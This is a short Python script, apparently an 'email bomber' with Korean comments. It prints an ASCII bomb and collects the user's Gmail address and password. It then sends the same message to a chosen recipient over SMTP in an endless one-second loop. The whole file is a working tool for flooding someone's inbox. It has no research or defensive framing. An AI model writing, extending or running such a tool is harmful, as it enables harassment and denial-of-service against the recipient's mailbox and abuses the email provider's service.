import smtplib
import time
import os

def print_bomb():
    bomb = [
        "\033[91m    _.-^^---....,,--         ",
        " _--                  --_    ",
        "<                        >)  ",
        "|                         |  ",
        " \\._                   _./   ",
        "    ```--. . , ; .--'''      ",
        "          | |   |            ",
        "       .-=||  | |=-.         ",
        "       `-=#$%&%$#=-'         ",
        "          | ;  :|            ",
        "        ___\\   /___          ",
        "       /    `---'    \\       \033[0m"
    ]
    
    for line in bomb:
        print(line)
        time.sleep(0.1)

def print_menu():
    print("\033[33m---------- menu -----------\033[0m")
    print("\033[33m[1] E-Mail\033[0m")
    print("\033[33m[2] Quit\033[0m")

def validate_email(email):
    if "@gmail.com" not in email and "@naver.com" not in email:
        print("\033[94mNot E-Mail\033[0m")
        input("Press Enter to restart")
        main()

def validate_password(password):
    if len(password) < 6:  # 비밀번호가 6자리 미만인 경우
        print("\033[94mNot E-Mail Password\033[0m")
        input("Press Enter to restart")
        main()

def send_email(sender_email, password, receiver_email, message):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, password)
        
        server.sendmail(sender_email, receiver_email, message)
        print("\033[93mEmail sent successfully!\033[0m")
        server.quit()
    except Exception as e:
        print("Error:", e)

def main():
    os.system('cls' if os.name == 'nt' else 'clear')  # 콘솔 화면 지우기
    print_bomb()  # 폭탄 모양 출력
    
    print_menu()
    choice = input("Choose an option: ")
    if choice == "1":
        sender_email = input("\033[94mYour E-mail: \033[0m")
        validate_email(sender_email)
        
        password = input("\033[94mPassword: \033[0m")
        validate_password(password)
        
        receiver_email = input("\033[94mReceiver Email: \033[0m")
        validate_email(receiver_email)

        message = input("\033[94mMessage: \033[0m")

        count = 0
        while True:
            send_email(sender_email, password, receiver_email, message)
            count += 1
            print(f"\033[93mE-Mail Send! ({count})\033[0m")
            time.sleep(1)
    elif choice == "2":
        exit()
    else:
        print("Invalid choice. Please choose a valid option.")
        input("Press Enter to restart")
        main()

if __name__ == "__main__":
    main()
